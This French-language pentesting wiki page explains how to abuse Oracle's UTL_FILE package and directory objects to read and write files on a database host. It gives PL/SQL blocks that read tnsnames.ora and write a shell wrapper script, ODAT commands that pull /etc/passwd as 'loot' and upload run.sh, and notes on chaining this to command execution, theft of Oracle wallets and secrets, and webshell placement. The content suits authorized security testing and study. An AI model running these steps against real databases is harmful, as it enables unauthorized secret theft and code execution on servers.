---
title: "Accès aux fichiers Oracle : lecture et écriture avec UTL_FILE"
description: "Lire et écrire des fichiers sur l'hôte Oracle via le paquet UTL_FILE et un objet directory, pour voler des secrets côté serveur ou déposer un script wrapper ou un webshell que les voies d'exécution de commandes du scheduler et des tables externes exécutent ensuite."
keywords:
  - UTL_FILE
  - directory object
  - ODAT
  - Oracle file write
  - Oracle file read
---

# Accès aux fichiers

Oracle lit et écrit des fichiers de l'hôte en tant que son **compte de service** via le paquet **`UTL_FILE`**, qui opère sur un **objet directory** (un chemin serveur nommé). C'est une primitive à part entière (voler la configuration et les secrets) et l'étape de préparation de l'[exécution de commandes](command-execution.md) : écrire un script wrapper pour un job du scheduler, ou un webshell sous un chemin servi.

## Prérequis

`UTL_FILE` nécessite `EXECUTE` sur le paquet plus un **objet directory** et les **droits `READ`/`WRITE`** correspondants sur celui-ci. Créer l'objet avec `CREATE ANY DIRECTORY` vous accorde ceux-ci automatiquement ; réutiliser un objet existant (`SELECT directory_name, directory_path FROM all_directories;`) nécessite un droit `READ`/`WRITE` explicite sur celui-ci, sinon `FOPEN` échoue avec `ORA-29289`.

## Lecture et écriture

```sql
-- read (loop to the end; GET_LINE returns one line at a time)
DECLARE f UTL_FILE.FILE_TYPE; l VARCHAR2(4000); BEGIN
  f := UTL_FILE.FOPEN('MY_DIR','tnsnames.ora','R');
  LOOP BEGIN UTL_FILE.GET_LINE(f,l); DBMS_OUTPUT.PUT_LINE(l);
    EXCEPTION WHEN NO_DATA_FOUND THEN EXIT; END; END LOOP;
  UTL_FILE.FCLOSE(f);
END;/

-- write a wrapper script (with a shebang; see note on running it)
DECLARE f UTL_FILE.FILE_TYPE; BEGIN
  f := UTL_FILE.FOPEN('MY_DIR','run.sh','W');
  UTL_FILE.PUT_LINE(f,'#!/bin/sh');
  UTL_FILE.PUT_LINE(f,'id > /tmp/o'); UTL_FILE.FCLOSE(f);
END;/
```

```bash
# ODAT takes a server filesystem PATH (it builds a temporary directory object from it,
# so this route needs CREATE ANY DIRECTORY), then remoteFile and localFile
odat utlfile -s <target> -d <SID> -U user -P pass --getFile /etc passwd ./loot
odat utlfile -s <target> -d <SID> -U user -P pass --putFile /tmp run.sh ./run.sh
```

## Notes d'exploitation

- L'**écriture** de fichier est le levier qui complète la chaîne d'exécution de commandes : la voie du [scheduler](command-execution.md) ne peut pas passer de métacaractères de shell, donc préparez un script wrapper avec `UTL_FILE` et exécutez-le avec `/bin/sh /tmp/run.sh`. Un fichier écrit par `UTL_FILE` n'est pas exécutable, donc invoquez l'interpréteur plutôt que d'exécuter le fichier directement, et incluez le shebang.
- La **lecture** de fichier extrait les secrets propres à Oracle (`tnsnames.ora`, fichiers wallet, journaux de trace) et les fichiers de l'hôte que le compte de service peut lire, étendant l'accès à d'autres instances.
- Les écritures et les lectures sont bornées par ce que possède le **compte de service oracle** et par le chemin de l'objet directory, donc énumérez `all_directories` et choisissez-en un atteignable.
- `odat utlfile` gère la plomberie PL/SQL et constitue la voie rapide ; les blocs bruts comptent lorsque vous n'avez qu'une injection SQL, pas une session.

## Outils

- **ODAT** (`utlfile --getFile` / `--putFile`) : lire et écrire des fichiers de l'hôte.
- **sqlplus** : exécuter directement les blocs PL/SQL `UTL_FILE`.

## Références

- [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)
- [HackTricks: Oracle injection, file read and write](https://hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/index.html)
- [Oracle: UTL_FILE package](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html)
